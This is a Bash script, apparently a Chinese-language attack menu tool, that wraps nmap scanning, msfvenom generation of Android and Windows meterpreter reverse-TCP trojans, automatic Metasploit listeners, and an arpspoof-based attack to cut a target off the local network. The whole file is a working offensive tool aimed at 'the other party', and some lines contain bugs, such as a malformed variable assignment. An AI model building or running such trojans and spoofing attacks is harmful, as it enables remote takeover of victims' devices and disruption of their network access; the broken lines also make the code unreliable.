#!/bin/bash
NO_COLOR="\e[0m"
WHITE="\e[0;17m"
BOLD_WHITE="\e[1;37m"
BLACK="\e[0;30m"
BLUE="\e[0;34m"
BOLD_BLUE="\e[1;34m"
GREEN="\e[0;32m"
BOLD_GREEN="\e[1;32m"
CYAN="\e[0;36m"
BOLD_CYAN="\e[1;36m"
RED="\e[0;31m"
BOLD_RED="\e[1;31m"
PURPLE="\e[0;35m"
BOLD_PURPLE="\e[1;35m"
BROWN="\e[0;33m"
BOLD_YELLOW="\e[1;33m"
GRAY="\e[0;37m"
BOLD_GRAY="\e[1;30m"
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
blue='\033[0;34m'
magenta='\033[0;35m'
cyan='\033[0;36m'
#总颜色参数配置


#控制台
function console {
echo -e "$red
/\$\$\$\$\$\$                               
 /\$\$__  \$\$                              
 | \$\$  \__/  /\$\$\$\$\$\$\$  /\$\$\$\$\$\$  /\$\$\$\$\$\$\$ 
 |  \$\$\$\$\$\$  /\$\$_____/ |____  \$\$| \$\$__  \$\$
  \\____  \$\$| \$\$        /\$\$\$\$\$\$\$| \$\$  \ \$\$
   /\$\$  \ \$\$| \$\$       /\$\$__  \$\$| \$\$  | \$\$
   |  \$\$\$\$\$\$/|  \$\$\$\$\$\$\$|  \$\$\$\$\$\$\$| \$\$  | \$\$
    \\______/  \\_______/ \\_______/|__/  |__/
    
    
    by huocai
    https://www.github.com/huocai520
    "
echo -e "$blue
1.nmap扫描
2.生成木马
3.打开监听
4.断网攻击
5.退出此程序"
echo -e "$green
请输入序号进行选择"
read number
if [ $number == 1 ];
then
	echo -e "$green请输入要扫描的ip或者网段"
	read nmapip
	nmapscan
fi
if [ $number == 2 ];
then
	echo -e "$green请输入自己的ip"
	read msflhost
	echo -e "$green请输入端口"
	read msflport
	echo -e "$blue
请选择生成的木马类型
1.安卓木马
2.电脑木马(windows)
	"
	read muma
	msfmuma
fi
if [ $number == 3 ];
then
	echo -e "$green请输入监听IP"
	read jtip
	echo -e "$green请输入监听端口"
	read jtport
	echo -e "$blue
请选择对方的木马类型
1.安卓木马
2.电脑木马(windows)
	        "
	read jtmuma
	jianting
fi
if [ $number == 4 ];
then
	echo -e "$green
tps:只能在内网环境下使用
"
	echo -e "$green请输入对方IP"
	read dwhost
	echo -e "$green请输入网关"
	read dwwg
	dw
fi
if [$number == 5 ];
then
	exit 8
fi
}



#NMAP扫描
function nmapscan {
echo -e "$green 
-------------------------------NMAP扫描中...--------------------------------"
sudo nmap -sT -sV -O $nmapip
exit 8
}



#msf木马生成
function msfmuma {
echo -e "$red
------------------------------木马正在生成中...-----------------------------"
if [ $muma == 1 ];
then
	sudo msfvenom -p android/meterpreter/reverse_tcp lhost=$msflhost lport=$msflport R > android.apk
	echo -e "$red
------------------------------自动设置监听中...-----------------------------"
	echo "
	use exploit/multi/handler
	set payload android/meterpreter/reverse_tcp
	set lhost $msflhost
	set lport $msflport
	run
	" > android.rc
	msfconsole -r android.rc
	sleep 100s
	rm android.rc
	exit 8

fi
if [ $muma == 2 ];
then
	sudo msfvenom -p windows/meterpreter/reverse_tcp lhost=$msflhost lport=$msflport -f exe -o windows.exe
	echo -e "$red
------------------------------自动设置监听中...-----------------------------
"
        echo "
	use exploit/multi/handler
	set payload windows/meterpreter/reverse_tcp
	set lhost $msflhost
	set lport $msflport
	run" > windows.rc
	msfconsole -r windows.rc
	sleep 100s
	rm windows.rc
	exit 8
fi
}


#监听设置
function jianting {
echo -e "$red
------------------------------自动设置监听中...-----------------------------"
if [ $jtmuma == 1 ];
then
	jtpa = 'android/meterpreter/reverse_tcp'
fi
if [ $jtmuma == 2 ];
then
	jtpa = 'windows/meterpreter/reverse_tcp'
fi
echo "
use exploit/multi/handler
set payload $jtpa
set lhost $jtip
set lport $jtport
run" > jt.rc
msfconsole -r jt.rc
sleep 100s
rm jt.rc
exit 8
}


#断网攻击
function dw {
echo -e "$red 
------------------------------正在进行断网.....-----------------------------"
arpspoof -i eth0 -t $dwhost $dwwg
sleep 20s
exit 8
}


#主入口
console
